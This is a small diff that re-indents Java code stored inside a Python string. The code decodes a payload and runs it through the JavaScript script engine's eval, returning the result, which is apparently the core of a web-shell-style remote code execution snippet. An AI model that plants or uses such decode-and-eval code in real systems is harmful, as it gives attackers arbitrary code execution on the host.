@@ -6,7 +6,7 @@ code = """
         }
         payload = new String(decoder(payload));
         String result = (new javax.script.ScriptEngineManager()
-                .getEngineByName("js").eval(payload)).toString();
+            .getEngineByName("js").eval(payload)).toString();
         return result;
     }
 """
